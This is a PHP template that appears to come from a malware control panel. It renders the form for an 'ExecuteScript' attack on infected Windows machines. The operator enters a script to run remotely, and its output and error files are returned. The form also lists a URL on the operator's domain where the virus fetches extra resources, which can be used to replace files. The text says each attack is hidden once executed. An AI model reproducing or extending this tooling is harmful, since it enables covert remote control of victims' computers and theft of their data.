<?php

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript;
use function Kelvinho\Virus\stripProtocol;

/** @var ExecuteScript $attack */

?>

<label for="script">Script</label>
<textarea id="script" rows="12" cols="80" class="w3-input"
          style="resize: vertical;" <?php echo($attack->getStatus() != AttackBase::STATUS_DORMANT ? "disabled" : ""); ?>><?php echo $attack->getScript(); ?></textarea>
<p>Place the script you want to run above. There will be a file where you can pipe your results to at
    <b>%~pd0data</b>, and that file will be returned. There is another file at <b>%~pd0err</b> that will be
    returned. You can pipe error logs over there.</p>

<h3>Extra resources</h3>
<p>You can add extra resources here. This basically means you can have some piece of text that is accessible publicly,
    so the virus will be able to see it and you will be able to use it in your attacks. You can use this to replace
    files. How it works is you first define a number of extras with a unique resource identifier (should be nice,
    simple, have no space and is alphanumeric). Then you can access the extra resource at:</p>
<textarea class="w3-input w3-border"
          id="extras-url"
          cols="80"
          onclick="this.focus();this.select()"
          readonly="readonly"><?php echo stripProtocol(ALT_DOMAIN); ?>/vrs/<?php echo $attack->getVirusId() ?>/aks/<?php echo $attack->getAttackId() ?>/extras/&lt;resource identifier&gt;</textarea>
<p>Please note that like all attacks, they are all hidden right away once it is executed. This is no exception. Also if
    security is what you value, you can also use an encrypted connection by just adding https:// at the front</p>
<div id="extras-wrapper"></div>
<br>
